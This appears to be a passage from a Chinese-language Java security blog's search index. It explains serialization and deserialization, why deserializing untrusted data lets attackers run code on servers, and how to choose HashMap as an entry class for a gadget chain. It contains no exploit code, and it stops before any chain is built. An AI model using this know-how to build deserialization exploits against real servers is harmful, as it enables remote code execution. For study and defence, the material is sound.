    <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
<p>序列化可以将 Java 对象转换为字节序列，并将其存储到文件中或数据库中，该字节包含对象的数据、对象的类型、对象的存储属性。这使得 Java 程序可以很容易地保存和加载数据，而无需每次都重新创建对象。例如，一个 Java 应用程序可以将用户数据序列化到文件中，以便在下次启动时加载。</p>
<p><strong>2. 远程通信</strong></p>
<p>序列化还可以用于在网络上传输 Java 对象。例如，一个 Java 应用程序可以将一个对象序列化并发送给另一个应用程序，或者将一个对象从客户端发送到服务器。这使得 Java 程序可以很容易地在不同的机器之间共享数据。</p>
<h2 id="序列化与反序列化的实现"><a href="#序列化与反序列化的实现" class="headerlink" title="序列化与反序列化的实现"></a>序列化与反序列化的实现</h2><p>序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
<p>而反序列化是使用了<code>ObjectInputStream类</code>的<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>定义了一个Person类，实现了<strong>Serializable</strong>接口，有两个属性和一个构造方法，重写了<code>toString()</code></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135149134.png" alt="image-20240521135149134"></p>
<p>可以看到<strong>Serializable</strong>是空接口，可以理解为是一个标记，实现了它才能序列。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135203323.png" alt="image-20240521135203323"></p>
<p>定义了一个serialize静态方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135344209.png" alt="image-20240521135344209"></p>
<p>序列化的结果</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135254681.png" alt="image-20240521135254681"></p>
<p>反序列化：还原成在序列化前的一个类。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521135403252.png" alt="image-20240521135403252"></p>
<h2 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题"></a>为什么会产生安全问题</h2><p>只要序列化一个数据，上传到服务器，如果服务器反序列化了，那其中的代码一定会执行，给予了攻击者在服务器执行代码的能力。</p>
<p>或者说传入一个序列化数据，服务器反序列化一定会执行<code>readObject()</code>方法</p>
<h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
<p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了<code>readObject()</code>方法，JDK会自动调用重写的<code>readObject()</code>方法，而不调用原生的<code>readObject()</code>）<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521141902419.png" alt="image-20240521141902419"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521142108326.png" alt="image-20240521142108326"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
</search>
